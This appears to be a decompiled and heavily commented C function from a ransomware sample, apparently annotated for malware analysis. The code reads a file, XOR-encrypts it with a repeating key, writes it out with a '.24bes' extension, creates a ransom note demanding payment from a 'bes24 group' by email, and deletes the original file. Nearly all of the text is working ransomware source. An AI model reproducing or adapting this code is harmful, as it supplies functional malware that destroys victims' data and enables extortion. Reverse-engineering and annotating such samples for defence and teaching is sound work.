void encrypt_file(char *the_name_of_file_to_encrypt, char *key)   // Function to encrypt a file: the_name_of_file_to_encrypt = filename, key = key/password string
{
  byte current_byte;                                     // Temporary byte variable used during encryption
  ulong current_index;                                    // Temporary unsigned long variable (used for index math)
  int iVar3;                                      // Integer to store return value of remove()
  size_t length_of_key;                                   // Size variable to hold length of the key string
  char local_848 [1024];                          // Buffer for note filename string
  char local_448 [1032];                          // Buffer for encrypted filename string
  FILE *local_40;                                 // File pointer for the ransom note file
  void *memory_holding_file_contents;                                 // Pointer to memory buffer holding file contents
  size_t file_size_in_bytes;                                // Variable to store size of the original file
  FILE *file_to_encrypt;                                 // File pointer for the main file (original and encrypted)
  ulong loop_counter;                                 // Loop counter for iterating over file bytes
  
  // Open file 
  file_to_encrypt = fopen(the_name_of_file_to_encrypt,"rb");
  
  // Failed to open file  
  if (file_to_encrypt == NULL) {
    printf("Error opening file: %s\n",the_name_of_file_to_encrypt);
  }

  // Successfully opened file 
  else {
    // This part is used to determine file size in bytes
    // fseek -> go to last byte of file
    // ftell -> get current position, which gives file size
    fseek(file_to_encrypt,0,2);
    file_size_in_bytes = ftell(file_to_encrypt);
    
    // Go to first byte of file 
    rewind(file_to_encrypt);

    // Here we allocate memory to hold entire file
    memory_holding_file_contents = malloc(file_size_in_bytes);

    // Read the file into the memory that we allocated
    fread(memory_holding_file_contents,1,file_size_in_bytes,file_to_encrypt);

    // Close the original file, we will work with memory that we allocated
    fclose(file_to_encrypt);

    // Loop while index is less than file size
    // loop_counter -> starts at 0
    // current_index -> set to the iteration number of loop
    for (loop_counter = 0; current_index = loop_counter, (long)loop_counter < (long)file_size_in_bytes; loop_counter = loop_counter + 1) {
      // Read byte number loop_counter from the buffer memory_holding_file_contents
      current_byte = memory_holding_file_contents[loop_counter];

      length_of_key = strlen(key);
      
      
      memory_holding_file_contents[loop_counter] = current_byte ^ key[current_index % length_of_key];
    }
    snprintf(local_448,0x400,"%s.24bes",the_name_of_file_to_encrypt); // Build new filename: "<original>.24bes" into local_448
    file_to_encrypt = fopen(local_448,"wb");             // Open new file in binary write mode for encrypted data
    fwrite(memory_holding_file_contents,1,file_size_in_bytes,file_to_encrypt);         // Write encrypted buffer to the new file
    fclose(file_to_encrypt);                             // Close the encrypted file
    free(memory_holding_file_contents);                               // Free the memory buffer holding file contents
    snprintf(local_848,0x400,"%s_note.txt",local_448);  // Build note filename: "<encrypted>.24bes_note.txt"
    local_40 = fopen(local_848,"w");              // Create/open the ransom note text file for writing
    if (local_40 == (FILE *)0x0) {                // Check if note file creation failed
      printf("Error creating note file: %s\n",local_848); // Print error if note could not be created
    }
    else {                                        // If note file opened successfully
      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n"
             ,1,0x99,local_40);                   // Write the ransom note message into the note file
      fclose(local_40);                           // Close the ransom note file
    }
    iVar3 = remove(the_name_of_file_to_encrypt);                      // Delete the original unencrypted file
    if (iVar3 != 0) {                             // Check if removal failed (non-zero return)
      printf("Error deleting original file: %s\n",the_name_of_file_to_encrypt); // Print error if original file not deleted
    }
  }
  return;                                         // Return from function (void)

